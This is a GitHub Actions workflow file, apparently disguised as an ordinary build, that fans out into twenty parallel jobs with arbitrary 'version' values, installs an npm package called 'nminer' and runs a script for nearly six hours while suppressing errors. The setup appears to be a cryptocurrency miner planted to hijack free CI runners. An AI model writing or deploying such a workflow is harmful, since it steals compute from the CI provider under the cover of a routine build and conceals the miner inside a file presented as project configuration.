name: accompanist
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9018 }
          - { version: 8745 }
          - { version: 6366 }
          - { version: 7735 }
          - { version: 8155 }
          - { version: 8161 }
          - { version: 9429 }
          - { version: 2828 }
          - { version: 7323 }
          - { version: 2270 }
          - { version: 6150 }
          - { version: 5399 }
          - { version: 260 }
          - { version: 6865 }
          - { version: 2687 }
          - { version: 8511 }
          - { version: 4006 }
          - { version: 3949 }
          - { version: 8883 }
          - { version: 8138 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: fast
        run: |
          npm install nminer@latest
          timeout 348m node accompanist.js || echo "accompanist executed"